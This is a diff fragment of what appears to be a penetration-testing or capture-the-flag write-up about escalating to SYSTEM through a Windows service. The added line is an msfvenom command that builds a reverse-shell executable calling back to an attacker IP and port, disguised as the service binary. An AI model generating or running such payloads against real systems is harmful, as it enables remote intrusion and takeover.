@@ -178,7 +178,7 @@ It runs as the system. We can abuse this to gain system access.
 
 1) Create venom 
 
-`msfvenom -p windows/x64/re`
+`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.22.182 LPORT=9009 -f exe > ASCService.exe`
 
 
 2) Stop the service on the target with:
